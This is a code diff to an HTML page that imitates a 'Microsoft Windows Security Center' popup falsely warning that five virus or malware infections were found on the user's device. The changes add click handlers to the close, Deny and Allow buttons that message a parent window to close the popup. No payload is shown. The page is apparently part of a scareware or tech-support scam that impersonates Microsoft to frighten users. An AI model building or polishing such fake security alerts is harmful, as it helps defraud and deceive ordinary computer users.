@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -164,7 +165,7 @@
                 </div>
                 <span>Microsoft Windows Security Center</span>
             </div>
-            <span class="close">×</span>
+            <span class="close" onclick="window.parent.postMessage('closeSecondPopup', '*')" style="cursor: pointer;">×</span>
         </div>
         <div class="content">
             <div class="warning">(5) Virus/Malware infections have been recognized on your device.</div>
@@ -200,8 +201,8 @@
                 </div>
             </div>
             <div class="buttons">
-                <button class="deny">Deny</button>
-                <button class="allow">Allow</button>
+                <button class="deny" onclick="window.parent.postMessage('closeSecondPopup', '*')">Deny</button>
+                <button class="allow" onclick="window.parent.postMessage('closeSecondPopup', '*')">Allow</button>
             </div>
         </div>
     </div>
